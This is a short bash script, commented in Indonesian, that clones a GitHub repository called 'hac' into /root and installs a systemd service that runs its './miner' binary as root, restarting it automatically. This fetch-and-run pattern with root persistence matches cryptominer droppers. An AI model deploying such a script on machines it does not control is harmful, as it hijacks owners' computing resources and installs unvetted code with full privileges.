#!/bin/bash

# Step 1: Clone repository hac.git
if [ ! -d "/root/hac" ]; then
    # Repository belum diunduh, lakukan clone
    git clone https://github.com/cecepabdul/hac.git /root/hac
fi

# Step 2: Buat file konfigurasi systemd
sudo tee /etc/systemd/system/hac.service <<EOF
[Unit]
Description=Hac Service
After=network.target

[Service]
ExecStart=/bin/bash -c "cd /root/hac && chmod +x ./miner && ./miner"
WorkingDirectory=/root/hac
Restart=always
RestartSec=3
User=root

[Install]
WantedBy=multi-user.target
EOF

# Step 3: Setel izin pada file konfigurasi
sudo chmod 644 /etc/systemd/system/hac.service

# Step 4: Muat ulang konfigurasi systemd
sudo systemctl daemon-reload

# Step 5: Mulai layanan hac
sudo systemctl start hac

# Tunggu selama 10 detik
sleep 10

# Periksa status layanan hac
sudo systemctl status hac
